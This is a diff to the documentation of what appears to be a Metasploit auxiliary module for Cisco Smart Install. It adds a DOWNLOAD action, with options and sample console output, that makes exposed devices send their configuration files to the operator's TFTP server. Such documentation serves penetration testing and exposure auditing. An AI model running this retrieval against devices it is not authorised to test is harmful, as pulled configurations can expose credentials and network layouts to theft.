@@ -5,13 +5,28 @@
 ## Verification Steps
 
   1. Do: ```use auxiliary/scanner/misc/cisco_smart_install```
-  2. Do: ```set [RHOSTS]```, replacing ```[RHOSTS]``` with a list of hosts to test for the presence of SMI
+  2. Do: ```set ACTION SCAN```
+  3. Do: ```set [RHOSTS]```, replacing ```[RHOSTS]``` with a list of hosts to test for the presence of SMI
   3. Do: ```run```
   4. If the host is exposing an identifiable SMI instance, it will print the endpoint.
 
+## Options
+
+### SLEEP
+Time to wait for connection back from target. Default is `60` seconds if using `DOWNLOAD` action
+
+### LHOST
+Address to bind to for TFTP server to accept connections if using `DOWNLOAD` if using `DOWNLOAD` action
+
+## Actions
+There are two actions, default being ```SCAN```
+
+  1. **SCAN** - Scan for Smart Install endpoints. [Default]
+  2. **DOWNLOAD** - Request devices configuration and send to our TFTP server
 
 ## Scenarios
 
+Using the default `SCAN` action
   ```
 msf auxiliary(cisco_smart_install) > run
 
@@ -26,5 +41,19 @@ msf auxiliary(cisco_smart_install) > run
 [*] Scanned 466 of 512 hosts (91% complete)
 [+] a.b.c.d:4786   - Fingerprinted the Cisco Smart Install protocol
 [*] Scanned 512 of 512 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Using the `DOWNLOAD` action
+
+  ```
+msf auxiliary(cisco_smart_install) > run
+[*] a.b.c.d:4786   - Starting TFTP Server...
+[*] a.b.c.d:4786   - Requesting configuration from device...
+[*] a.b.c.d:4786   - Waiting 60 seconds for configuration
+[*] a.b.c.d:4786   - Incoming file from a.b.c.d - jaPJDPpi.conf 14733 bytes
+[*] a.b.c.d:4786   - Providing some time for transfers to complete...
+[*] a.b.c.d:4786   - Shutting down the TFTP service...
+[*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
